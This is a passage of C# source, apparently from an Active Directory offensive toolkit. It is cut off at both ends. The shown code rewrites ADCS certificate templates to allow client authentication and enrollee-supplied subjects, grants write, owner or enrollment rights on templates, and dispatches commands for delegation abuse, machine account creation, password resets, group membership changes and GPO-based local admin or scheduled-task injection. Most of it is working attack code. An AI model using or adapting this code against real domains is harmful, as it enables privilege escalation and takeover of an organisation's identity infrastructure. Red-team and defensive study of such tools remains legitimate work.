                                defNC = new DirectoryEntry("LDAP://" + sSearchBase, sUserDomain, sPass);
                            }
                            else
                            {
                                defNC = new DirectoryEntry("LDAP://" + sSearchBase);
                            }

                            ds = new DirectorySearcher(defNC);
                            ds.Filter = String.Format("(&(objectclass=pKICertificateTemplate)(name={0}))", sFilter);

                            src = ds.FindAll();

                            // We only want to see 1 result here
                            if (src.Count == 0)
                            {
                                Console.WriteLine("\n[>] CA " + sCA + " does not publish this template..");
                                continue;
                            } else if (src.Count > 1)
                            {
                                Console.WriteLine("[!] More than one ADCS template found..");
                                return;
                            }

                            foreach (SearchResult srt in src)
                            {
                                // Is this a template that belongs to the CA?
                                String sName = srt.Properties["name"][0].ToString();
                                if (lTemplates.Contains(srt.Properties["name"][0].ToString()))
                                {
                                    Console.WriteLine("\n[>] Publishing CA          : " + sCA);
                                    Console.WriteLine("    |_ Template            : " + srt.Properties["name"][0].ToString());
                                    if (srt.Properties.Contains("mspki-enrollment-flag"))
                                    {
                                        Console.WriteLine("    |_ Enroll Flags        : " + (hStandIn.msPKIEnrollmentFlag)Convert.ToInt32(srt.Properties["mspki-enrollment-flag"][0].ToString()));
                                    }
                                    if (srt.Properties.Contains("mspki-certificate-name-flag"))
                                    {
                                        Console.WriteLine("    |_ Name Flags          : " + (hStandIn.msPKICertificateNameFlag)Convert.ToInt32(srt.Properties["mspki-certificate-name-flag"][0].ToString()));
                                    }
                                    if (srt.Properties.Contains("pKIExtendedKeyUsage"))
                                    {
                                        var EKUs = srt.Properties["pKIExtendedKeyUsage"];
                                        if (EKUs.Count > 0)
                                        {
                                            for (int e = 0; e < EKUs.Count; e++)
                                            {
                                                if (e == 0)
                                                {
                                                    Console.WriteLine("    |_ pKIExtendedKeyUsage : " + (new Oid(srt.Properties["pKIExtendedKeyUsage"][e].ToString())).FriendlyName);
                                                }
                                                else
                                                {
                                                    Console.WriteLine("    |                        " + (new Oid(srt.Properties["pKIExtendedKeyUsage"][e].ToString())).FriendlyName);
                                                }
                                            }
                                        }
                                    }
                                    if (srt.Properties.Contains("whenCreated"))
                                    {
                                        Console.WriteLine("    |_ Created             : " + srt.Properties["whenCreated"][0].ToString());
                                    }
                                    if (srt.Properties.Contains("whenChanged"))
                                    {
                                        Console.WriteLine("    |_ Modified            : " + srt.Properties["whenChanged"][0].ToString());
                                    }
                                }

                                DirectoryEntry mde = srt.GetDirectoryEntry();
                                ResultPropertyCollection omProps = srt.Properties;

                                if (bEKU)
                                {
                                    // Update EKU
                                    List<String> lEKU = new List<String>();
                                    try
                                    {
                                        foreach (var element in omProps["pKIExtendedKeyUsage"])
                                        {
                                            lEKU.Add(element.ToString());
                                        }
                                    }
                                    catch
                                    {
                                        Console.WriteLine("[!] Failed to get pKIExtendedKeyUsage property..");
                                        return;
                                    }

                                    if (!bRemove)
                                    {
                                        if (lEKU.Contains("1.3.6.1.5.5.7.3.2"))
                                        {
                                            Console.WriteLine("\n[!] pKIExtendedKeyUsage already allows client authentication..");
                                            return;
                                        }

                                        Console.WriteLine("\n[+] Adding pKIExtendedKeyUsage : Client Authentication");
                                        lEKU.Add("1.3.6.1.5.5.7.3.2");
                                        mde.Properties["pKIExtendedKeyUsage"].Value = (Array)lEKU.ToArray();
                                    }
                                    else
                                    {
                                        if (lEKU.Count == 0)
                                        {
                                            Console.WriteLine("\n[!] pKIExtendedKeyUsage property does not exist..");
                                            return;
                                        }

                                        if (!lEKU.Contains("1.3.6.1.5.5.7.3.2"))
                                        {
                                            Console.WriteLine("\n[!] pKIExtendedKeyUsage already disallows client authentication..");
                                            return;
                                        }

                                        Console.WriteLine("\n[+] Removing pKIExtendedKeyUsage : Client Authentication");

                                        lEKU.Remove("1.3.6.1.5.5.7.3.2");
                                        mde.Properties["pKIExtendedKeyUsage"].Value = (Array)lEKU.ToArray();

                                    }
                                } else if (bNameFalg)
                                {
                                    // Update Name Flag
                                    hStandIn.msPKICertificateNameFlag oNameFlags;
                                    try
                                    {
                                        oNameFlags = (hStandIn.msPKICertificateNameFlag)Convert.ToInt32(srt.Properties["mspki-certificate-name-flag"][0].ToString());
                                    }
                                    catch
                                    {
                                        Console.WriteLine("[!] Failed to get msPKI-Certificate-Name-Flag property..");
                                        return;
                                    }

                                    // Does it already have ENROLLEE_SUPPLIES_SUBJECT?
                                    Boolean hasESS = (Boolean)((oNameFlags & hStandIn.msPKICertificateNameFlag.ENROLLEE_SUPPLIES_SUBJECT) != 0);

                                    if (!bRemove)
                                    {
                                        if (hasESS)
                                        {
                                            Console.WriteLine("\n[!] msPKI-Certificate-Name-Flag already has ENROLLEE_SUPPLIES_SUBJECT..");
                                            return;
                                        }
                                    
                                        Console.WriteLine("\n[+] Adding msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT");
                                        mde.Properties["mspki-certificate-name-flag"].Value = (Int32)(oNameFlags | hStandIn.msPKICertificateNameFlag.ENROLLEE_SUPPLIES_SUBJECT);
                                    }
                                    else
                                    {
                                        if (!hasESS)
                                        {
                                            Console.WriteLine("\n[!] msPKI-Certificate-Name-Flag doesn't have ENROLLEE_SUPPLIES_SUBJECT..");
                                            return;
                                        }

                                        Console.WriteLine("\n[+] Removing msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT");
                                        mde.Properties["mspki-certificate-name-flag"].Value = (Int32)(oNameFlags & ~hStandIn.msPKICertificateNameFlag.ENROLLEE_SUPPLIES_SUBJECT);
                                    }
                                } else if (bEnrollFlag)
                                {
                                    // Update Enroll Flag
                                    hStandIn.msPKIEnrollmentFlag oEnrollFlags;
                                    try
                                    {
                                        oEnrollFlags = (hStandIn.msPKIEnrollmentFlag)Convert.ToInt32(srt.Properties["mspki-enrollment-flag"][0].ToString());
                                    }
                                    catch
                                    {
                                        Console.WriteLine("[!] Failed to get msPKI-Enrollment-Flag property..");
                                        return;
                                    }

                                    // Does it already have PEND_ALL_REQUESTS?
                                    Boolean hasPend = (Boolean)((oEnrollFlags & hStandIn.msPKIEnrollmentFlag.PEND_ALL_REQUESTS) != 0);

                                    if (!bRemove)
                                    {
                                        if (hasPend)
                                        {
                                            Console.WriteLine("\n[!] msPKI-Enrollment-Flag already has PEND_ALL_REQUESTS..");
                                            return;
                                        }

                                        Console.WriteLine("\n[+] Adding msPKI-Enrollment-Flag : PEND_ALL_REQUESTS");
                                        mde.Properties["mspki-enrollment-flag"].Value = (Int32)(oEnrollFlags | hStandIn.msPKIEnrollmentFlag.PEND_ALL_REQUESTS);
                                    }
                                    else
                                    {
                                        if (!hasPend)
                                        {
                                            Console.WriteLine("\n[!] msPKI-Enrollment-Flag doesn't have PEND_ALL_REQUESTS..");
                                            return;
                                        }

                                        Console.WriteLine("\n[+] Removing msPKI-Enrollment-Flag : PEND_ALL_REQUESTS");
                                        mde.Properties["mspki-enrollment-flag"].Value = (Int32)(oEnrollFlags & ~hStandIn.msPKIEnrollmentFlag.PEND_ALL_REQUESTS);
                                    }
                                }

                                mde.CommitChanges();
                                Console.WriteLine("    |_ Success");
                            }

                        }
                        else
                        {
                            Console.WriteLine("\n[>] CA " + sCA + " does not publish any templates..");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Failed to modify ADCS template..");
                if (ex.InnerException != null)
                {
                    Console.WriteLine("    |_ " + ex.InnerException.Message);
                }
                else
                {
                    Console.WriteLine("    |_ " + ex.Message);
                }
            }
        }

        public static void ModifyADCSPermissions(String sFilter, String sGrant, Boolean bOwner, Boolean bEnroll, Boolean bWrite, Boolean bRemove, String sDomain = "", String sUser = "", String sPass = "")
        {
            try
            {
                DirectoryEntry rootdse = null;
                DirectoryEntry defNC = null;
                String sUserDomain = String.Empty;
                if (!String.IsNullOrEmpty(sDomain) && !String.IsNullOrEmpty(sUser) && !String.IsNullOrEmpty(sPass))
                {
                    sUserDomain = String.Format("{0}\\{1}", sDomain, sUser);
                    rootdse = new DirectoryEntry("LDAP://RootDSE", sUserDomain, sPass);
                }
                else
                {
                    rootdse = new DirectoryEntry("LDAP://RootDSE");
                }

                // Build path
                String sNamingContext = rootdse.Properties["configurationNamingContext"].Value.ToString();

                String sSearchBase = String.Empty;
                sSearchBase += "CN=Enrollment Services,CN=Public Key Services,CN=Services," + sNamingContext;

                Console.WriteLine("\n[+] Search Base  : LDAP://" + sSearchBase);

                if (!String.IsNullOrEmpty(sDomain) && !String.IsNullOrEmpty(sUser) && !String.IsNullOrEmpty(sPass))
                {
                    defNC = new DirectoryEntry("LDAP://" + sSearchBase, sUserDomain, sPass);
                }
                else
                {
                    defNC = new DirectoryEntry("LDAP://" + sSearchBase);
                }

                // Search
                DirectorySearcher ds = new DirectorySearcher(defNC);
                ds.Filter = "(objectCategory=pKIEnrollmentService)";
                SearchResultCollection src = ds.FindAll();

                foreach (SearchResult sr in src)
                {
                    String sCA = sr.Properties["name"][0].ToString();
                    if (sr.Properties.Contains("certificateTemplates"))
                    {
                        var aTemplates = sr.Properties["certificateTemplates"];
                        List<String> lTemplates = new List<string>();
                        if (aTemplates.Count > 0)
                        {
                            // Print published templates
                            for (int i = 0; i < aTemplates.Count; i++)
                            {
                                lTemplates.Add(aTemplates[i].ToString());
                            }

                            // Search for all published templates by this CA
                            sSearchBase = "CN=Certificate Templates,CN=Public Key Services,CN=Services," + sNamingContext;
                            if (!String.IsNullOrEmpty(sDomain) && !String.IsNullOrEmpty(sUser) && !String.IsNullOrEmpty(sPass))
                            {
                                defNC = new DirectoryEntry("LDAP://" + sSearchBase, sUserDomain, sPass);
                            }
                            else
                            {
                                defNC = new DirectoryEntry("LDAP://" + sSearchBase);
                            }

                            ds = new DirectorySearcher(defNC);
                            ds.Filter = String.Format("(&(objectclass=pKICertificateTemplate)(name={0}))", sFilter);

                            src = ds.FindAll();

                            // We only want to see 1 result here
                            if (src.Count == 0)
                            {
                                Console.WriteLine("\n[>] CA " + sCA + " does not publish this template..");
                                continue;
                            }
                            else if (src.Count > 1)
                            {
                                Console.WriteLine("[!] More than one ADCS template found..");
                                return;
                            }

                            foreach (SearchResult srt in src)
                            {
                                // Is this a template that belongs to the CA?
                                String sName = srt.Properties["name"][0].ToString();
                                if (lTemplates.Contains(srt.Properties["name"][0].ToString()))
                                {
                                    Console.WriteLine("\n[>] Publishing CA          : " + sCA);
                                    Console.WriteLine("    |_ Template            : " + srt.Properties["name"][0].ToString());
                                    if (srt.Properties.Contains("mspki-enrollment-flag"))
                                    {
                                        Console.WriteLine("    |_ Enroll Flags        : " + (hStandIn.msPKIEnrollmentFlag)Convert.ToInt32(srt.Properties["mspki-enrollment-flag"][0].ToString()));
                                    }
                                    if (srt.Properties.Contains("mspki-certificate-name-flag"))
                                    {
                                        Console.WriteLine("    |_ Name Flags          : " + (hStandIn.msPKICertificateNameFlag)Convert.ToInt32(srt.Properties["mspki-certificate-name-flag"][0].ToString()));
                                    }
                                    if (srt.Properties.Contains("pKIExtendedKeyUsage"))
                                    {
                                        var EKUs = srt.Properties["pKIExtendedKeyUsage"];
                                        if (EKUs.Count > 0)
                                        {
                                            for (int e = 0; e < EKUs.Count; e++)
                                            {
                                                if (e == 0)
                                                {
                                                    Console.WriteLine("    |_ pKIExtendedKeyUsage : " + (new Oid(srt.Properties["pKIExtendedKeyUsage"][e].ToString())).FriendlyName);
                                                }
                                                else
                                                {
                                                    Console.WriteLine("    |                        " + (new Oid(srt.Properties["pKIExtendedKeyUsage"][e].ToString())).FriendlyName);
                                                }
                                            }
                                        }
                                    }
                                    if (srt.Properties.Contains("whenCreated"))
                                    {
                                        Console.WriteLine("    |_ Created             : " + srt.Properties["whenCreated"][0].ToString());
                                    }
                                    if (srt.Properties.Contains("whenChanged"))
                                    {
                                        Console.WriteLine("    |_ Modified            : " + srt.Properties["whenChanged"][0].ToString());
                                    }
                                }

                                DirectoryEntry mde = srt.GetDirectoryEntry();
                                ResultPropertyCollection omProps = srt.Properties;

                                Console.WriteLine("\n[+] Set object access rules");
                                IdentityReference ir = new NTAccount(sGrant);

                                if (bOwner)
                                {
                                    // Change template owner
                                    Console.WriteLine("\n[+] Changing template owner : " + ir.ToString());
                                    mde.ObjectSecurity.SetOwner(ir);
                                }
                                else if (bEnroll)
                                {
                                    // Add Certificate-Enrollment permission for user
                                    if (bRemove)
                                    {
                                        Console.WriteLine("\n[+] Removing Certificate-Enrollment permission : " + ir.ToString());
                                        Guid rightGuid = new Guid("0e10c968-78fb-11d2-90d4-00c04f79dc55");
                                        ActiveDirectoryAccessRule ar = new ActiveDirectoryAccessRule(ir, ActiveDirectoryRights.ExtendedRight, AccessControlType.Allow, rightGuid, ActiveDirectorySecurityInheritance.None);
                                        mde.Options.SecurityMasks = System.DirectoryServices.SecurityMasks.Dacl;
                                        mde.ObjectSecurity.RemoveAccessRule(ar);
                                    } else
                                    {
                                        Console.WriteLine("\n[+] Adding Certificate-Enrollment permission : " + ir.ToString());
                                        Guid rightGuid = new Guid("0e10c968-78fb-11d2-90d4-00c04f79dc55");
                                        ActiveDirectoryAccessRule ar = new ActiveDirectoryAccessRule(ir, ActiveDirectoryRights.ExtendedRight, AccessControlType.Allow, rightGuid, ActiveDirectorySecurityInheritance.None);
                                        mde.Options.SecurityMasks = System.DirectoryServices.SecurityMasks.Dacl;
                                        mde.ObjectSecurity.AddAccessRule(ar);
                                    }
                                }
                                else if (bWrite)
                                {
                                    // Add WriteDacl/WriteOwner/WriteProperty permission for user
                                    if (bRemove)
                                    {
                                        Console.WriteLine("\n[+] Removing write permissions : " + ir.ToString());
                                        ActiveDirectoryAccessRule ar = new ActiveDirectoryAccessRule(ir, ActiveDirectoryRights.WriteDacl, AccessControlType.Allow, ActiveDirectorySecurityInheritance.None);
                                        mde.Options.SecurityMasks = System.DirectoryServices.SecurityMasks.Dacl;
                                        mde.ObjectSecurity.RemoveAccessRule(ar);

                                        ar = new ActiveDirectoryAccessRule(ir, ActiveDirectoryRights.WriteOwner, AccessControlType.Allow, ActiveDirectorySecurityInheritance.None);
                                        mde.Options.SecurityMasks = System.DirectoryServices.SecurityMasks.Dacl;
                                        mde.ObjectSecurity.RemoveAccessRule(ar);

                                        ar = new ActiveDirectoryAccessRule(ir, ActiveDirectoryRights.WriteProperty, AccessControlType.Allow, ActiveDirectorySecurityInheritance.None);
                                        mde.Options.SecurityMasks = System.DirectoryServices.SecurityMasks.Dacl;
                                        mde.ObjectSecurity.RemoveAccessRule(ar);
                                    }
                                    else
                                    {
                                        Console.WriteLine("\n[+] Adding write permissions : " + ir.ToString());
                                        ActiveDirectoryAccessRule ar = new ActiveDirectoryAccessRule(ir, ActiveDirectoryRights.WriteDacl, AccessControlType.Allow, ActiveDirectorySecurityInheritance.None);
                                        mde.Options.SecurityMasks = System.DirectoryServices.SecurityMasks.Dacl;
                                        mde.ObjectSecurity.AddAccessRule(ar);

                                        ar = new ActiveDirectoryAccessRule(ir, ActiveDirectoryRights.WriteOwner, AccessControlType.Allow, ActiveDirectorySecurityInheritance.None);
                                        mde.Options.SecurityMasks = System.DirectoryServices.SecurityMasks.Dacl;
                                        mde.ObjectSecurity.AddAccessRule(ar);

                                        ar = new ActiveDirectoryAccessRule(ir, ActiveDirectoryRights.WriteProperty, AccessControlType.Allow, ActiveDirectorySecurityInheritance.None);
                                        mde.Options.SecurityMasks = System.DirectoryServices.SecurityMasks.Dacl;
                                        mde.ObjectSecurity.AddAccessRule(ar);
                                    }
                                }

                                mde.CommitChanges();
                                Console.WriteLine("    |_ Success");
                            }

                        }
                        else
                        {
                            Console.WriteLine("\n[>] CA " + sCA + " does not publish any templates..");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Failed to modify ADCS permissions..");
                if (ex.InnerException != null)
                {
                    Console.WriteLine("    |_ " + ex.InnerException.Message);
                }
                else
                {
                    Console.WriteLine("    |_ " + ex.Message);
                }
            }
        }

        // Args
        class ArgOptions
        {
            [Option(null, "computer")]
            public String sComp { get; set; }

            [Option(null, "object")]
            public String sObject { get; set; }

            [Option(null, "group")]
            public String sGroup { get; set; }

            [Option(null, "sid")]
            public String sSid { get; set; }

            [Option(null, "domain")]
            public String sDomain { get; set; }

            [Option(null, "user")]
            public String sUser { get; set; }

            [Option(null, "pass")]
            public String sPass { get; set; }

            [Option(null, "grant")]
            public String sGrant { get; set; }

            [Option(null, "type")]
            public String sType { get; set; }

            [Option(null, "newpass")]
            public String sNewPass { get; set; }

            [Option(null, "ntaccount")]
            public String sNtaccount { get; set; }

            [Option(null, "guid")]
            public String sGUID { get; set; }

            [Option(null, "filter")]
            public String sFilter { get; set; }

            [Option(null, "ldap")]
            public String sLdap { get; set; }

            [Option(null, "localadmin")]
            public String sLocalAdmin { get; set; }

            [Option(null, "setuserrights")]
            public String sSetUserRights { get; set; }

            [Option(null, "tasktype")]
            public String sTaskType { get; set; }

            [Option(null, "taskname")]
            public String sTaskName { get; set; }

            [Option(null, "author")]
            public String sAuthor { get; set; }

            [Option(null, "command")]
            public String sCommand { get; set; }

            [Option(null, "args")]
            public String sArgs { get; set; }

            [Option(null, "target")]
            public String sTarget { get; set; }

            [Option(null, "targetsid")]
            public String sTargetSID { get; set; }

            [Option(null, "setspn")]
            public String sSetSPN { get; set; }

            [Option(null, "principal")]
            public String sPrincipal { get; set; }

            [Option(null, "delegation")]
            public Boolean bDelegation { get; set; }

            [Option(null, "asrep")]
            public Boolean bAsrep { get; set; }

            [Option(null, "spn")]
            public Boolean bSPN { get; set; }

            [Option(null, "dc")]
            public Boolean bDc { get; set; }

            [Option(null, "trust")]
            public Boolean bTrust { get; set; }
            [Option(null, "site")]
            public Boolean bSite { get; set; }

            [Option(null, "remove")]
            public Boolean bRemove { get; set; }

            [Option(null, "add")]
            public Boolean bAdd { get; set; }

            [Option(null, "make")]
            public Boolean bMake { get; set; }

            [Option(null, "disable")]
            public Boolean bDisable { get; set; }

            [Option(null, "delete")]
            public Boolean bDelete { get; set; }

            [Option(null, "access")]
            public Boolean bAccess { get; set; }

            [Option(null, "help")]
            public Boolean bHelp { get; set; }

            [Option(null, "gpo")]
            public Boolean bGPO { get; set; }

            [Option(null, "acl")]
            public Boolean bACL { get; set; }

            [Option(null, "increase")]
            public Boolean bIncrease { get; set; }

            [Option(null, "dns")]
            public Boolean bDNS { get; set; }

            [Option(null, "policy")]
            public Boolean bPolicy { get; set; }

            [Option(null, "passnotreq")]
            public Boolean bPasswdnotreqd { get; set; }

            [Option(null, "legacy")]
            public Boolean bLegacy { get; set; }

            [Option(null, "forest")]
            public Boolean bForest { get; set; }

            [Option(null, "adcs")]
            public Boolean bADCS { get; set; }

            [Option(null, "clientauth")]
            public Boolean bClientAuth { get; set; }

            [Option(null, "ess")]
            public Boolean bESS { get; set; }

            [Option(null, "pend")]
            public Boolean bPend { get; set; }

            [Option(null, "owner")]
            public Boolean bOwner { get; set; }

            [Option(null, "write")]
            public Boolean bWrite { get; set; }

            [Option(null, "enroll")]
            public Boolean bEnroll { get; set; }

            [Option(null, "limit")]
            public UInt32 iLimit { get; set; }
        }

        static void Main(string[] args)
        {
            var ArgOptions = new ArgOptions();
            if (CommandLineParser.Default.ParseArguments(args, ArgOptions))
            {
                if (ArgOptions.bHelp || args.Length == 0)
                {
                    hStandIn.getHelp();
                }
                else
                {

                    if (!String.IsNullOrEmpty(ArgOptions.sComp) || !String.IsNullOrEmpty(ArgOptions.sObject) || !String.IsNullOrEmpty(ArgOptions.sGroup) || !String.IsNullOrEmpty(ArgOptions.sLdap) || !String.IsNullOrEmpty(ArgOptions.sSid) || !String.IsNullOrEmpty(ArgOptions.sSetSPN) || ArgOptions.bSPN || ArgOptions.bDelegation || ArgOptions.bAsrep || ArgOptions.bDc || ArgOptions.bTrust || ArgOptions.bSite || ArgOptions.bGPO || ArgOptions.bDNS || ArgOptions.bPolicy || ArgOptions.bPasswdnotreqd || ArgOptions.bADCS)
                    {
                        if (!String.IsNullOrEmpty(ArgOptions.sComp))
                        {
                            if (ArgOptions.bRemove)
                            {
                                removeAllowedToActOnBehalfOfOtherIdentity(ArgOptions.sComp, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                            }
                            else if (ArgOptions.bMake)
                            {
                                LDAPMakeMachineAccount(ArgOptions.sComp, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                            }
                            else if (ArgOptions.bDisable)
                            {
                                disableMachineAccount(ArgOptions.sComp, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                            }
                            else if (ArgOptions.bDelete)
                            {
                                deleteMachineAccount(ArgOptions.sComp, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                            }
                            else if (!String.IsNullOrEmpty(ArgOptions.sSid))
                            {
                                setAllowedToActOnBehalfOfOtherIdentity(ArgOptions.sComp, ArgOptions.sSid, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                            }
                            else
                            {
                                Console.WriteLine("[!] Insufficient arguments provided with --computer..");
                            }
                        }
                        else if (!String.IsNullOrEmpty(ArgOptions.sSid))
                        {
                            StringToUserOrSID(ArgOptions.sSid, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                        }
                        else if (!String.IsNullOrEmpty(ArgOptions.sObject))
                        {
                            if (ArgOptions.bAccess)
                            {
                                getObjectAccessPermissions(ArgOptions.sObject, ArgOptions.sNtaccount, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                            }
                            else if (!String.IsNullOrEmpty(ArgOptions.sGrant))
                            {
                                if (!String.IsNullOrEmpty(ArgOptions.sType) && ArgOptions.sType.ToLower() != "none")
                                {
                                    try
                                    {
                                        hStandIn.AccessRequest arq = (hStandIn.AccessRequest)Enum.Parse(typeof(hStandIn.AccessRequest), ArgOptions.sType.ToLower());
                                        grantObjectAccessPermissions(ArgOptions.sObject, arq, ArgOptions.sGUID, ArgOptions.sGrant, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                                    }
                                    catch
                                    {
                                        Console.WriteLine("[!] Invalid access premission type provided..");
                                    }
                                }
                                else if (!String.IsNullOrEmpty(ArgOptions.sGUID))
                                {
                                    grantObjectAccessPermissions(ArgOptions.sObject, hStandIn.AccessRequest.none, ArgOptions.sGUID, ArgOptions.sGrant, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                                }
                                else
                                {
                                    grantObjectAccessPermissions(ArgOptions.sObject, hStandIn.AccessRequest.genericall, ArgOptions.sGUID, ArgOptions.sGrant, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                                }
                            }
                            else if (!String.IsNullOrEmpty(ArgOptions.sNewPass))
                            {
                                setAccountPassword(ArgOptions.sObject, ArgOptions.sNewPass, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                            }
                            else if (ArgOptions.bAsrep)
                            {
                                if (ArgOptions.bRemove)
                                {
                                    setASREP(ArgOptions.sObject, true, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                                }
                                else
                                {
                                    setASREP(ArgOptions.sObject, false, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                                }
                            }
                            else
                            {
                                returnObject(ArgOptions.sObject, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass, ArgOptions.sFilter);
                            }
                        }
                        else if (!String.IsNullOrEmpty(ArgOptions.sGroup))
                        {
                            if (!String.IsNullOrEmpty(ArgOptions.sNtaccount) && ArgOptions.bAdd || ArgOptions.bRemove)
                            {
                                if (ArgOptions.bAdd)
                                {
                                    addUserToGroup(ArgOptions.sGroup, ArgOptions.sNtaccount, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                                } else
                                {
                                    removeUserFromGroup(ArgOptions.sGroup, ArgOptions.sNtaccount, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                                }
                            }
                            else
                            {
                                getGroupMembership(ArgOptions.sGroup, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                            }
                        }
                        else if (ArgOptions.bSPN)
                        {
                            getSPNAccounts(ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                        }
                        else if (ArgOptions.bDelegation)
                        {
                            getDelegationAccounts(ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                        }
                        else if (ArgOptions.bAsrep)
                        {
                            getASREPAccounts(ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                        }
                        else if (ArgOptions.bDc)
                        {
                            GetADDomainControllers();
                        }
                        else if (ArgOptions.bTrust)
                        {
                            GetADTrustRelationships();
                        }
                        else if (ArgOptions.bSite)
                        {
                            GetADSites();
                        }
                        else if (!String.IsNullOrEmpty(ArgOptions.sLdap))
                        {
                            returnLDAP(ArgOptions.sLdap, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass, ArgOptions.sFilter, ArgOptions.iLimit);
                        }
                        else if (ArgOptions.bGPO)
                        {
                            if (!String.IsNullOrEmpty(ArgOptions.sFilter) && !String.IsNullOrEmpty(ArgOptions.sLocalAdmin))
                            {
                                GPONewLocalAdmin(ArgOptions.sFilter, ArgOptions.sLocalAdmin, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                            }
                            else if (!String.IsNullOrEmpty(ArgOptions.sFilter) && !String.IsNullOrEmpty(ArgOptions.sSetUserRights) && !String.IsNullOrEmpty(ArgOptions.sGrant))
                            {
                                GPOAddUserRights(ArgOptions.sFilter, ArgOptions.sSetUserRights, ArgOptions.sGrant, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                            }
                            else if (!String.IsNullOrEmpty(ArgOptions.sFilter) && !String.IsNullOrEmpty(ArgOptions.sTaskType) && !String.IsNullOrEmpty(ArgOptions.sAuthor) && !String.IsNullOrEmpty(ArgOptions.sCommand))
                            {
                                GPOAddImmediateTask(ArgOptions.sFilter, ArgOptions.sTaskType, ArgOptions.sAuthor, ArgOptions.sCommand, ArgOptions.sTaskName, ArgOptions.sArgs, ArgOptions.sTarget, ArgOptions.sTargetSID, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                            }
                            else if (!String.IsNullOrEmpty(ArgOptions.sFilter) && ArgOptions.bIncrease)
                            {
                                GPOObjectIncCounter(ArgOptions.sFilter, ArgOptions.sTaskType, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                            }
                            else
                            {
                                returnGPOs(ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass, ArgOptions.sFilter, ArgOptions.iLimit, ArgOptions.bACL);
                            }
                        }
                        else if (ArgOptions.bDNS)
                        {
                            AdiDNSDump(ArgOptions.sFilter, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass, ArgOptions.bLegacy, ArgOptions.bForest, ArgOptions.iLimit);
                        }
                        else if (ArgOptions.bPolicy)
                        {
                            getDomainPolicy(ArgOptions.sFilter, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                        }
                        else if (ArgOptions.bPasswdnotreqd)
                        {
                            getPassNotReqdAccounts(ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                        }
                        else if (!String.IsNullOrEmpty(ArgOptions.sSetSPN))
                        {
                            if (!String.IsNullOrEmpty(ArgOptions.sPrincipal) && ArgOptions.bAdd || ArgOptions.bRemove)
                            {
                                updateSPNProperty(ArgOptions.sSetSPN, ArgOptions.sPrincipal, ArgOptions.bAdd, ArgOptions.bRemove, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                            } else
                            {
                                Console.WriteLine("[!] Insufficient arguments provided (--principal/add/remove)..");
                            }
                        }
                        else if (ArgOptions.bADCS)
                        {
                            if (ArgOptions.bClientAuth)
                            {
                                if (!String.IsNullOrEmpty(ArgOptions.sFilter) && ArgOptions.bAdd || ArgOptions.bRemove)
                                {
                                    if (ArgOptions.bAdd)
                                    {
                                        ModifyADCSTemplate(ArgOptions.sFilter, true, false, false, false, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                                    } else
                                    {
                                        ModifyADCSTemplate(ArgOptions.sFilter, true, false, false, true, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                                    }
                                } else
                                {
                                    Console.WriteLine("[!] Insufficient arguments provided (--filter/--add/--remove)..");
                                }
                            } else if (ArgOptions.bESS)
                            {
                                if (!String.IsNullOrEmpty(ArgOptions.sFilter) && ArgOptions.bAdd || ArgOptions.bRemove)
                                {
                                    if (ArgOptions.bAdd)
                                    {
                                        ModifyADCSTemplate(ArgOptions.sFilter, false, true, false, false, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                                    }
                                    else
                                    {
                                        ModifyADCSTemplate(ArgOptions.sFilter, false, true, false, true, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                                    }
                                }
                                else
                                {
                                    Console.WriteLine("[!] Insufficient arguments provided (--filter/--add/--remove)..");
                                }
                            } else if (ArgOptions.bPend)
                            {
                                if (!String.IsNullOrEmpty(ArgOptions.sFilter) && ArgOptions.bAdd || ArgOptions.bRemove)
                                {
                                    if (ArgOptions.bAdd)
                                    {
                                        ModifyADCSTemplate(ArgOptions.sFilter, false, false, true, false, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                                    }
                                    else
                                    {
                                        ModifyADCSTemplate(ArgOptions.sFilter, false, false, true, true, ArgOptions.sDomain, ArgOptions.sUser, ArgOptions.sPass);
                                    }
                                }
                                else
                                {
                                    Console.WriteLine("[!] Insufficient arguments provided (--filter/--add/--remove)..");
                                }
                            } else if (!String.IsNullOrEmpty(ArgOptions.sNtaccount))
                            {
                                if (ArgOptions.bOwner)
                                {
                                    if (!String.IsNullOrEmpty(ArgOptions.sFilter))
